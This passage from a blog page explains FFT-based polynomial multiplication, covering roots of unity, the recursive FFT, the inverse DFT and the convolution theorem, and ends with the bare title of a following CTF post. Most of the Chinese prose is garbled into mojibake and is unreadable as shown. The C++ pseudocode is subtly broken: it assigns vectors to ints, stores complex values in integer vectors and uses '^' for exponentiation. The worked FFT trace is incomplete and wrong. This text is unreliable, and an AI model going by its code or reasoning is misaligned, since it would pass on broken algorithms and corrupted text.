class="math inline">\(A(x),B(x)\)</span>ä¸Šå„å–2n-2ä¸ªç‚¹,è®¡ç®—è¿™2n-2ä¸ªç‚¹çš„ç§¯,è¿™å°±å¾—å‡ºäº†ç§¯å¤šé¡¹å¼çš„ç‚¹å€¼è¡¨ç¤º</p>
<p>å…¶ä¸­ç¬¬iä¸ªç‚¹<span class="math inline">\(C(x_i,A(x_i)\times
B(x_i))\)</span>çºµåæ ‡ä¸ºä¸¤ä¸ªå¤šé¡¹å¼åœ¨<span
class="math inline">\(x_0\)</span>å¤„å‡½æ•°å€¼çš„ä¹˜ç§¯</p>
<p>ç”»åœ¨å›¾ä¸Šä¹Ÿå°±æ˜¯:</p>
<p>æ™®é€šä¹˜æ³•æ˜¯æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„lowBæ–¹æ³•,ä¸‹é¢æ›²çº¿æ•‘å›½nb,å°±æ±‚å€¼å’Œæ’å€¼è¿™ä¸¤æ­¥æ˜¯çœŸnb,æ±‚å€¼å’Œæ’å€¼ä¸ºä½•æ˜¯<span
class="math inline">\(O(n\lg n)\)</span>å‘¢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219191232000.png"
alt="image-20221219191232000" />
<figcaption aria-hidden="true">image-20221219191232000</figcaption>
</figure>
<p>ä½¿ç”¨ä¹‹å‰å­¦è¿‡çš„æ–¹æ³•,è¿™ä¸¤æ­¥éƒ½æ˜¯<span
class="math inline">\(O(n^2)\)</span>çš„,</p>
<p>æ±‚å€¼æ—¶éœ€è¦å°†<span
class="math inline">\(x_0,x_1...\)</span>ä»¥æ­¤å¸¦å…¥<span
class="math inline">\(A(x)\)</span>ä¸€å…±nä¸ªè‡ªå˜é‡,æ¯ä¸ªè‡ªå˜é‡æ±‚å€¼éƒ½æ˜¯<span
class="math inline">\(O(n)\)</span>,å› æ­¤æ€»å…±<span
class="math inline">\(O(n^2)\)</span></p>
<p>æ’å€¼æ—¶éœ€è¦ä½¿ç”¨æ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•,ä¹Ÿæ˜¯<span
class="math inline">\(O(n^2)\)</span></p>
<blockquote>
<p>æ‹‰æ ¼æœ—æ—¥æ’å€¼å…¬å¼: <span class="math display">\[
A(x)=\sum_{k=0}^{n-1}y_k\frac{\Pi_{j\neq k }(x-x_j)}{\Pi_{j\neq
k}(x_k-x_j)}
\]</span> å…¶ä¸­<span
class="math inline">\((x_0,y_0),(x_1,y_1),...,(x_n-1,y_n-1)\)</span>æ˜¯å¤šé¡¹å¼<span
class="math inline">\(A(x)\)</span>çš„ç‚¹å€¼è¡¨ç¤º</p>
<p>æœ€å¤–å±‚è¿™ä¸ªæ±‚å’Œå·²ç»æ˜¯<span class="math inline">\(O(n)\)</span></p>
<p>ç”¨äºŒç»´æ•°ç»„<span
class="math inline">\(M[k][j]=x_k-x_j\)</span>é¢„å¤„ç†åˆ†æ¯,</p>
<p>åˆ†å­é¢„å…ˆå…ˆç›´æ¥æ±‚å‡º<span
class="math inline">\(F(x)=\Pi(x-x_j)\)</span></p>
<p>é‚£ä¹ˆå¯¹äºä¸€ä¸ªç»™å®šçš„k,åˆ†æ¯å°±æ˜¯nä¸ªæ•°çš„ç§¯,<span
class="math inline">\(O(n)\)</span></p>
<p>åˆ†å­å°±æ˜¯<span class="math inline">\(F(x)/(x-x_j)\)</span>,<span
class="math inline">\(O(n)\)</span></p>
<p>ä¹˜ä¸Šæœ€å¤–åœˆçš„<span class="math inline">\(O(n)\)</span>å¾—åˆ°<span
class="math inline">\(O(n^2)\)</span></p>
<p>ä¹Ÿå°±æ˜¯è¯´,ä¹‹å‰ä½¿ç”¨çš„æ–¹æ³•æ˜¯<span
class="math inline">\(O(n^2)\)</span>çš„</p>
</blockquote>
<p>ä½†æ˜¯ä½¿ç”¨å¿«é€Ÿå‚…é‡Œå¶å˜æ¢è¿™ç§åŠæ³•,å°±èƒ½ç»™ä»–é™åˆ°<span
class="math inline">\(O(n\lg n)\)</span></p>
<p>æ€ä¹ˆé™çš„?é€‰ç‚¹å€¼çš„æ—¶å€™æœ‰è®²ç©¶</p>
<p>ä»»æ„nä¸ªä¸åŒçš„ç‚¹å°±å¯ä»¥ç¡®å®šä¸€ä¸ªn-1æ¬¡è¡¨è¾¾å¼.</p>
<p>å¦‚æœé€‰nä¸ªå•ä½å¤æ ¹,ç„¶åå¯¹ç³»æ•°å‘é‡<span
class="math inline">\((a_0,a_1,...,a_{n-1})\)</span>åº”ç”¨ç¦»æ•£å‚…é‡Œå¶å˜æ¢DFT,å°±å¯ä»¥åœ¨<span
class="math inline">\(O(n\lg
n)\)</span>å†…å®Œæˆæ±‚å€¼,ä½¿ç”¨é€†DFTå˜æ¢å°±å¯ä»¥åœ¨<span
class="math inline">\(O(n\lg n)\)</span>å®Œæˆæ’å€¼</p>
<h2 id="å•ä½å¤æ ¹å„¿">å•ä½å¤æ ¹å„¿</h2>
<p>"næ¬¡å•ä½å¤æ ¹"å°±æ˜¯æŒ‡æ»¡è¶³<span
class="math inline">\(\omega^n=1\)</span>çš„è´Ÿæ•°<span
class="math inline">\(\omega\)</span>,æ³¨æ„æ˜¯è¿™ä¸ª<span
class="math inline">\(\omega\)</span>,ä¸å¸¦é‚£ä¸ªnæ¬¡æ–¹,ä¸€å®šè¦æ³¨æ„ä¸Šä¸‹è§’æ ‡</p>
<p>æ¬§æ‹‰å…¬å¼ <span class="math display">\[
e^{i\pi}+1=0
\]</span> ç¬¬kä¸ªnæ¬¡å•ä½å¤æ ¹æ˜¯<span
class="math inline">\(\omega_k=e^{\frac{2\pi ik}{n}}\)</span></p>
<p>æ˜¾ç„¶<span class="math inline">\(\omega_k^n=(e^{\frac{2\pi
ik}{n}})^n=e^{2\pi ik}=((e^{i\pi})^2)^k=((-1)^2)^k=1^k=1\)</span></p>
<p>næ¬¡å•ä½å¤æ ¹å„¿æ°å¥½æœ‰nä¸ª,ä¹Ÿå°±æ˜¯<span
class="math inline">\(k=0,1,2,...,n-1\)</span></p>
<p>è¿™nä¸ªç”»åœ¨å¤å¹³é¢å„¿ä¸Šæ˜¯å¾ˆæ•´é½çš„,æ¯”å¦‚8æ¬¡å¤æ ¹å°±é•¿è¿™æ ·:</p>
<p>ä»»ä½•ä¸¤ä¸ªç›¸é‚»çš„å•ä½å¤æ ¹ä¹‹é—´çš„è§’åº¦éƒ½æ˜¯å›ºå®šçš„,<span
class="math inline">\(360/n=360/8\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219193558548.png"
alt="image-20221219193558548" />
<figcaption aria-hidden="true">image-20221219193558548</figcaption>
</figure>
<p>éƒ½è½åœ¨å¤å¹³é¢å•ä½å…ƒä¸Š</p>
<p>æ˜¾ç„¶8æ¬¡å¤æ ¹åªæœ‰8ä¸ª,å¦‚æœéè¦å†™ç¬¬ä¹ä¸ª<span
class="math inline">\(\omega_8^9\)</span>,å°±å’Œ<span
class="math inline">\(\omega_8^0\)</span>é‡åˆäº†,</p>
<p>ç„¶åä¹¦ä¸Šå°±è¯´è¿™æ˜¯åŠ æ³•ç¾¤<span
class="math inline">\((Z_8,+)\)</span>,ç¡®å®æ˜¯,é™¤äº†è£…äº†ä¸ªBå¯¹äºè§£å†³é—®é¢˜æ²¡æœ‰å¸®åŠ©,ç”šè‡³æ²¡æœ‰å­¦è¿‡æŠ½ä»£çš„å°±è’™è”½äº†</p>
<h2 id="dft">DFT</h2>
<p>æ±‚n-1æ¬¡å¤šé¡¹å¼çš„ç‚¹å€¼è¡¨ç¤ºæ—¶,å°±éœ€è¦é€‰å–nä¸ªç‚¹<span
class="math inline">\((x_0,x_1,x,...,x_{n-1})\)</span>,ç„¶åæ±‚å‡ºå„è‡ªçš„å‡½æ•°å€¼<span
class="math inline">\((y_0,y_1,...,y_{n-1})\)</span></p>
<p>å¦‚æœé€‰å–çš„nä¸ªç‚¹æ˜¯nä¸ªå¯Œå“¥å„¿,é‚£ä¹ˆæ­¤æ—¶æœ‰ <span class="math display">\[
y_k=A(\omega_n^k)=\sum_{j=0}^{n-1}a_j\omega _n^{jk}
\]</span> ä»¥æ­¤å¾—åˆ°çš„<span
class="math inline">\(\vec{y}=(y_0,y_1,...,y_{n-1})\)</span>å«åšç³»æ•°å‘é‡<span
class="math inline">\(\vec{a}=(a_0,a_1,...,a_{n-1})\)</span>çš„ç¦»æ•£å‚…é‡Œå¶å˜æ¢,</p>
<p>è®°ä½œ<span class="math inline">\(\vec{y}=DFT_n(\vec{a})\)</span></p>
<p>ç¬‘æ­»,è¿™çœ‹ä¸Šå»ä¸å°±æ˜¯å¸¦å…¥æ±‚å€¼å—,é€‰nä¸ªå¯Œå“¥æœ‰å±ç”¨å•Š?</p>
<p>å¦‚æœç”¨æ™®é€šçš„å¸¦å…¥æ±‚å€¼,æ‰¾nä¸ªå¯Œå“¥å„¿å’Œæ‰¾nä¸ªæ™®é€šäººå„¿æ²¡æœ‰åŒºåˆ«.</p>
<p>å¯Œå“¥å„¿çš„ä½œç”¨ä¸èƒ½æµªè´¹å–½,ä»–ä»¬å’Œæ™®é€šå€¼åˆæœ‰å•¥åŒºåˆ«å‘¢?</p>
<p>è¿™å°±æ˜¯å•ä½å¤æ ¹å„¿çš„å‡ ä¸ªæ€§è´¨</p>
<p>è¿™å‡ ä¸ªæ€§è´¨åœ¨è®¡ç®—æ—¶ä¼šä½“ç°ç¾¤è®ºçš„å¯¹ç§°æ€§,è¿™æ„å‘³ç€,è¿™nä¸ªå¯Œå“¥ç¡®å®èƒ½å¤Ÿæ¯”nä¸ªæ™®é€šå€¼æºå¸¦æ›´å¤šçš„ä¿¡æ¯</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219195023551.png"
alt="image-20221219195023551" />
<figcaption aria-hidden="true">image-20221219195023551</figcaption>
</figure>
</blockquote>
<h2 id="fft">FFT</h2>
<p>fast Fourier transform,å¿«é€Ÿå‚…é‡Œå¶å˜æ¢</p>
<p>åœ¨<span class="math inline">\(O(n\lg n)\)</span>å†…æ±‚è§£DFTçš„ç®—æ³•</p>
<p>ä¹Ÿå°±æ˜¯è¯´,DFTå¹¶ä¸æ˜¯ä¸€ä¸ªæ±‚è§£æ–¹æ³•,åªæ˜¯å¨¶äº†nä¸ªå¯Œå“¥ä½œä¸ºç‚¹å€¼è¡¨ç¤º</p>
<p>ä»ç„¶å¯ä»¥ä½¿ç”¨å¸¦å…¥æ±‚å€¼è¿™ç§<span
class="math inline">\(O(n^2)\)</span>çš„lowBç®—æ³•æ±‚è§£</p>
<p>è€ŒFFTå°±æ˜¯ä¸€ç§åŠæ³•</p>
<p>ä»–è¿™æ ·å˜å½¢:</p>
<p>é¦–å…ˆnå‘ä¸Šå–æ•´åˆ°æœ€è¿‘çš„2çš„å¹‚æ¬¡,è¿™æ ·åšæ˜¯ä¸ºäº†ä¿è¯èƒ½å¤Ÿä¸€ç›´äºŒåˆ†ç›´åˆ°å‰©1é¡¹,åæ­£å¤šå–ç‚¹ä¸ä¼šé™ä½ç²¾åº¦</p>
<p>åé¢çš„né»˜è®¤å°±è®¤ä¸ºæ˜¯2çš„å¹‚æ¬¡äº† <span class="math display">\[
\begin{aligned}
A(x)&amp;=a_0+a_1x+a_2x^2+...+a_{n-1}x^{n-1}\\
&amp;=(a_0+a_2x^2+a_4x^4+...+a_{n-2}x^{n-2})+(a_1x+a_3x^3+a_5x^{5}+...+a_{n-1}x^{n-1})\\
&amp;=A^{[0]}(x^2)+xA^{[1]}(x^2)
\end{aligned}
\]</span> ä¹Ÿå°±æ˜¯è¯´å°†<span
class="math inline">\(A(x)\)</span>æŒ‰ç…§å¶æ•°é¡¹å’Œå¥‡æ•°é¡¹åˆ†å¼€,å…¶ä¸­å¥‡æ•°é¡¹éƒ½æå‡ºä¸€ä¸ªxæ¥,è¿™æ ·å­å¤šé¡¹å¼ä¸­çš„xéƒ½æ˜¯å¶æ•°,å¯ä»¥æå–<span
class="math inline">\(x^2\)</span>ä½œä¸ºè‡ªå˜é‡,äºæ˜¯å¾—åˆ° <span
class="math display">\[
\begin{cases}
A^{[0]}(x)=a_0+a_2x+a_4x^2+...+a_{n-2}x^{\frac{n}{2}-1}\\
A^{[1]}(x)=a_1+a_3x+a_5x^2+...+a_{n-1}x^{\frac{n}{2}-1}
\end{cases}
\]</span> æ—¶åˆ»ä¸è¦å¿˜è®°åœ¨æ±‚ä»€ä¹ˆ,</p>
<p>æˆ‘ä»¬ç°åœ¨å·²çŸ¥çš„æ˜¯<span
class="math inline">\(\vec{a}=(a_0,a_1,a_2,...,a_{n-1})\)</span>,<span
class="math inline">\(\vec{x}=(\omega_n^0,\omega_n^1,...,\omega_n^{n-1})\)</span></p>
<p>è¦æ±‚çš„æ˜¯<span class="math inline">\(\vec
{y}=DFT_n(\vec{a})\)</span></p>
<p>ç°åœ¨å¯ä»¥è¿™æ ·ç®—äº†: <span class="math display">\[
A(x_k)=A(\omega_{n}^k)=A^{[0]}(\omega^{2k}_n)+\omega^k_nA^{[1]}(\omega^{2k}_n)
\]</span> æ³¨æ„åˆ°æˆ‘ä»¬ä¸å®¹æ˜“è®¡ç®—<span
class="math inline">\(A(x)\)</span>æ˜¯å› ä¸º,å®ƒçš„é¡¹å¤ªå¤šäº†,0æ¬¡é¡¹,1æ¬¡é¡¹ç­‰ç­‰ä¸€ç›´åˆ°n-1æ¬¡é¡¹,å…±né¡¹</p>
<p>è€Œç°åœ¨å¯¹äºä¸€ä¸ª<span
class="math inline">\(A^{[0]}(x)\)</span>ä»–åªæœ‰<span
class="math inline">\(\frac{n}{2}\)</span>é¡¹äº†,å·¥ä½œé‡ç›´æ¥ä¸‹é™åˆ°ä¸€åŠ</p>
<p>ä»¥æ­¤é€’å½’,æ€»ä¼šæœ‰ä¸ªæ—¶å€™,<span
class="math inline">\(A(x)\)</span>åªæœ‰ä¸€é¡¹,ä¹Ÿå°±æ˜¯0æ¬¡é¡¹,ä¹Ÿå°±æ˜¯é‚£ä¸ªå¸¸æ•°é¡¹,ç®—ä¹Ÿä¸ç”¨ç®—ç›´æ¥è¿”å›äº†,å’Œxæ²¡æœ‰å…³ç³»äº†,å’Œå¯Œå“¥æ²¡å…³ç³»äº†</p>
<p>å†™å‡ºä¼ªä»£ç :</p>
<p>æ³¨æ„FFTå‡½æ•°çš„è¾“å…¥æ˜¯ç›®æ ‡å¤šé¡¹å¼çš„ç³»æ•°å‘é‡,ä¸æ˜¯å¯Œå“¥,å› ä¸ºå¯Œå“¥æ˜¯ä½œä¸ºå¸¸æ•°ä½¿ç”¨çš„,ä¸éœ€è¦å‚æ•°ä¼ é€’</p>
<p>FFTå‡½æ•°è¾“å‡ºçš„æ˜¯<span
class="math inline">\(\vec{y}=DFT(\vec{a})\)</span>ä¹Ÿå°±æ˜¯å’Œå°†nä¸ªå¯Œå“¥ç›´æ¥å¸¦å…¥å¤šé¡¹å¼æ±‚å€¼å¾—åˆ°çš„nä¸ªå€¼ç›¸åŒ,ä½†æ˜¯ç®—æ³•æ›´å¥½</p>
<blockquote>
<p>ä¸€å®šæ³¨æ„å‡½æ•°ä¸æ˜¯y=A(x),è€Œæ˜¯y=FFT(a)</p>
<p>ä¸€å®šè¦æ¸…æ¥šå‡½æ•°åœ¨å¹²ä»€ä¹ˆ</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">FFT</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a)</span></span>&#123;<span class="comment">//aæ˜¯ç³»æ•°,è¿”å›yå‘é‡</span></span><br><span class="line">	n=a.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>==n)&#123;<span class="comment">//é€’å½’å‡ºå£æ¡ä»¶,åªå‰©ä¸€é¡¹æ—¶,ä¹Ÿå°±æ˜¯é‚£ä¸ªå¸¸æ•°é¡¹,ç›´æ¥è¿”å›æ­¤æ—¶çš„a,å®é™…ä¸Šæ˜¯a[0]ä½œä¸ºy[0]è¿”å›äº†y</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;;</span><br><span class="line">    Complex omega_n=e^(<span class="number">2</span>*pi*i/n);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a0,a1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)a<span class="number">0.</span><span class="built_in">push_back</span>(a[i]);</span><br><span class="line">        <span class="keyword">else</span> a<span class="number">1.</span><span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> y0=<span class="built_in">FFT</span>(a0);</span><br><span class="line">    <span class="type">int</span> y1=<span class="built_in">FFT</span>(a1);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">y</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;<span class="comment">//ä¸€å®šæ³¨æ„æ­¤å¤„ä¸Šç•Œæ˜¯n/2</span></span><br><span class="line">        y[i]	=y0[i]+<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//å®¹æ˜“ç†è§£</span></span><br><span class="line">       	y[n/<span class="number">2</span>+i]=y0[i]-<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//æƒ³å¯¹å›°éš¾</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé¢æœ‰ä¸€ä¸ª<code>y[n/2+i]=y0[i]-pow(omega_n,i)*y1[i]</code>,æ€ä¹ˆå¾—åˆ°çš„å‘¢?
<span class="math display">\[
\begin{aligned}
y[\frac{n}{2}+i]&amp;=A(\omega_n^{\frac{n}{2}+i})\\
&amp;=A^{[0]}(\omega_n^{n+2i})+\omega_n^{\frac{n}{2}+i}A^{[1]}(\omega_n^{n+2i})\\
&amp;=A^{[0]}(\omega_n^{2i})+\omega_n^{\frac{n}{2}+i}A^{[1]}(\omega_n^{2i})\\
&amp;=A^{[0]}(\omega_{\frac{n}{2}}^i)-\omega_n^{i}A^{[1]}(\omega_{\frac{n}{2}}^i)\\
&amp;=y_0[i]-\omega_{n}^i y_1[i]
\end{aligned}
\]</span>
<strong>è¿™å°±ä½“ç°å‡ºå¯Œå“¥å’Œæ™®é€šç‚¹çš„åŒºåˆ«äº†</strong>,å¯Œå“¥çš„å˜æ¢å¾ˆçµæ´»</p>
<p>ä»ä¸Šé¢çš„ä¼ªä»£ç å¯ä»¥çœ‹å‡º,æœ€åº•å±‚çš„é€’å½’å’Œè‡ªå˜é‡æ— å…³.</p>
<p>åŠ é€Ÿå‘ç”Ÿåœ¨è¿™é‡Œ,å°†å·¥ç¨‹é‡ç›´æ¥ç¼©å‡åˆ°ä¸€åŠ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;<span class="comment">//ä¸€å®šæ³¨æ„æ­¤å¤„ä¸Šç•Œæ˜¯n/2</span></span><br><span class="line">    y[i]	=y0[i]+<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//å®¹æ˜“ç†è§£</span></span><br><span class="line">   	y[n/<span class="number">2</span>+i]=y0[i]-<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//æƒ³å¯¹å›°éš¾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¯æ¬¡é€’å½’éƒ½å°†å·¥ç¨‹é‡ç¼©å‡ä¸€åŠ,å› æ­¤æ€»å·¥ç¨‹é‡ç›´æ¥å¯¹nå–å¯¹æ•° <span
class="math display">\[
T(n)=2T(\frac{n}{2})+\Theta(n)=\Theta(n\lg n)
\]</span></p>
<p>å¥½äº†åˆ°æ­¤FFTçš„æ€è·¯æœ‰äº†,æ±‚å€¼ç»“æŸ,ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ±‚å¾—äº†<span
class="math inline">\(y=DFT(a)\)</span></p>
<blockquote>
<p>ä¸¾ä¸ªä¾‹å­,<span
class="math inline">\(A(x)=1+2x+x^2+x^3\)</span>,æ­£å¥½æœ‰<span
class="math inline">\(2^2=4\)</span>é¡¹,n=4</p>
<p>4æ¬¡å•ä½å¤æ ¹<span class="math inline">\(\omega_4^k=e^{\frac{2\pi
ik}{4}}\)</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FFT(&lt;1,2,1,1&gt;)&#123;</span><br><span class="line">	n=&lt;1,2,1,1&gt;.length()=4;</span><br><span class="line">	a0=&lt;1,1&gt;;</span><br><span class="line">	a1=&lt;2,1&gt;;</span><br><span class="line">	w1;</span><br><span class="line">	y0=FFT(&lt;1,1&gt;)&#123;</span><br><span class="line">		n=&lt;1,1&gt;.length()=2;</span><br><span class="line">		a0=&lt;1&gt;;</span><br><span class="line">		a1=&lt;1&gt;;</span><br><span class="line">		y0=FFT(&lt;1&gt;)=&lt;1&gt;;</span><br><span class="line">		y1=FFT(&lt;1&gt;)=&lt;1&gt;;</span><br><span class="line">		y[0]=y[0]+w1</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¸‹é¢è€ƒè™‘å¦‚ä½•ä»ç‚¹å€¼å½¢å¼å€’å›å»,ä¹Ÿå°±æ˜¯å¦‚ä½•åœ¨<span
class="math inline">\(O(n\lg n)\)</span>å®ç°æ’å€¼</p>
<p>ç°åœ¨å·²çŸ¥çš„æ˜¯<span class="math inline">\(\vec{y}\)</span>å’Œ<span
class="math inline">\(\vec{x}=\{\omega_{n}^0,\omega_n^1,...,\omega_n^{n-1}\}\)</span>,æ±‚ç³»æ•°å‘é‡<span
class="math inline">\(\vec{a}\)</span></p>
<p>æ˜¾ç„¶å¯ä»¥å¾…å®šç³»æ•°æ³•è®¾nä¸ªç³»æ•°,ç„¶åå¸¦å…¥è‡ªå˜é‡å’Œå› å˜é‡,è§£ä¸€å…ƒnæ¬¡æ–¹ç¨‹ç»„.</p>
<p>é«˜æ–¯æ¶ˆå…ƒæ³•æ˜¯<span
class="math inline">\(O(n^2)\)</span>çš„lowBç®—æ³•,è¦ç”¨åŠç®—æ³•</p>
<p>å†™æˆçŸ©é˜µå½¢å¼</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219211357315.png"
alt="image-20221219211357315" />
<figcaption aria-hidden="true">image-20221219211357315</figcaption>
</figure>
<p>ä¹Ÿå°±æ˜¯è¯´,ä¸€çœ¼é¡¶é’ˆ,é‰´å®šä¸ºèŒƒå¾·è’™çŸ©é˜µ,å¿…ç„¶å¯é€†ä¸”é€†çŸ©é˜µå”¯ä¸€</p>
<p>ç°åœ¨è¦ç”¨å°½å¯èƒ½å¿«çš„æ–¹æ³•æ±‚è§£è¿™ä¸ªèŒƒå¾·è’™çŸ©é˜µ<span
class="math inline">\(V\)</span>çš„é€†çŸ©é˜µ,è¿™ä¸ªæ±‚è§£æ–¹æ³•å°±æ˜¯ç®—æ³•å…³é”®</p>
<p>è¿™æœ‰ä¸ªå®šç†<span
class="math inline">\(V^{-1}_n[j,k]=\frac{\omega_n^{-kj}}{n}\)</span></p>
<p>æ€ä¹ˆå¾—å‡ºæ¥çš„,æˆ‘çº¿æ€§ä»£æ•°å¿˜äº†,ä¸ä¼šè§£,ä½†æ˜¯<span
class="math inline">\(VV^{-1}\)</span>ç®—ä¸€ä¸‹ç¡®å®å¾—åˆ°<span
class="math inline">\(E\)</span>,æ»¡è¶³äº’é€†çŸ©é˜µçš„å®šä¹‰</p>
<p>ç”±äº<span class="math inline">\(\vec{a}=\vec
V^{-1}\vec{y}\)</span></p>
<p><span class="math inline">\(a_j\)</span>å°±ç­‰äº<span
class="math inline">\(\vec V^{-1}\)</span>çš„ç¬¬jè¡Œä¸<span
class="math inline">\(\vec y\)</span>çš„ä¹˜ç§¯,ä¹Ÿå°±æ˜¯è¯´ <span
class="math display">\[
a_j=\sum_{k=0}^{n-1}V_n^{-1}[j,k]\times y_k\\
=\sum_{k=0}^{n-1}\frac{\omega^{-kj}_n}{n}\times y_k\\
=\frac{1}{n}\sum_{k=0}^{n-1}\omega_n^{-kj}\times y_k
\]</span> æ±‚è§£ä¸€ä¸ª<span class="math inline">\(a_j\)</span>,æ˜¯<span
class="math inline">\(O(n)\)</span>å¤æ‚åº¦çš„,</p>
<p>å…±æœ‰nä¸ª<span class="math inline">\(a_j\)</span>,æ€»å…±å°±æ˜¯<span
class="math inline">\(O(n^2)\)</span>å¤æ‚åº¦çš„,æ€ä¹ˆé™åˆ°<span
class="math inline">\(O(n\lg n)\)</span>å‘¢?</p>
<p>å›å¿†æ­£å‘çš„FFTæ˜¯å¹²å•¥çš„æ¥ç€</p>
<p>æ˜¯æ±‚è§£<span class="math inline">\(\vec{y}=DFT_n(\vec
{a})\)</span>é—®é¢˜çš„</p>
<p>å…¶ä¸­<span
class="math inline">\(y_j=\sum_{k=0}^{n-1}a_j\omega_n^{jk}\)</span></p>
<p>ç±»æ¯”ä¸€ä¸‹ <span class="math display">\[
\begin{aligned}
n a_j&amp;=\sum_{k=0}^{n-1} y_k\omega_n^{-jk}\\
y_j&amp;=\sum_{k=0}^{n-1}a_k\omega_n^{jk}
\end{aligned}
\]</span> ä»¤<span
class="math inline">\(\vec{y&#39;}=n\vec{a},\)</span></p>
<p><span class="math inline">\(\vec{a&#39;}=\vec{y}\)</span></p>
<p>ä»¤å•ä½å¯Œå“¥å˜æˆå•ä½è´Ÿå“¥,å°±å¯ä»¥ç›´æ¥å¸¦å…¥FFTå‡½æ•°æ±‚è§£äº†<span
class="math inline">\(\vec{y&#39;}\)</span>äº†</p>
<p>è§£å‡ºæ¥éƒ½é™¤ä»¥nå°±å¾—åˆ°äº†<span class="math inline">\(\vec{a}\)</span></p>
<p>å› æ­¤åˆåœ¨<span class="math inline">\(O(n\lg n)\)</span>å†…è§£å†³äº†</p>
<h2 id="å›åˆ°å¤šé¡¹å¼æ±‚ç§¯">å›åˆ°å¤šé¡¹å¼æ±‚ç§¯</h2>
<p>å·ç§¯å®šç†:</p>
<p>å¯¹äºä¸¤ä¸ªé•¿åº¦ä¸ºnçš„å‘é‡<span class="math inline">\(\vec a,\vec
b\)</span> <span class="math display">\[
a\otimes b=DFT^{-1}_{2n}(DFT_{2n}(a)Â·DFT_{2n}(b))
\]</span> å°†å¤šé¡¹å¼A,Båªä¿ç•™ç³»æ•°çœ‹æˆå‘é‡a,b,æ­¤æ—¶<span
class="math inline">\(a\otimes b\)</span>å°±æ˜¯ç§¯å¤šé¡¹å¼ABçš„ç³»æ•°å‘é‡</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/11/11/moectf%E8%A1%A5%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/11/moectf%E8%A1%A5%E9%A2%98/" class="post-title-link" itemprop="url">moectfè¡¥é¢˜</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-11 11:36:00" itemprop="dateCreated datePublished" datetime="2022-11-11T11:36:00+08:00">2022-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-05 13:16:14" itemprop="dateModified" datetime="2024-07-05T13:16:14+08:00">2024-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="moectfè¡¥é¢˜">moectfè¡¥é¢˜</h1>
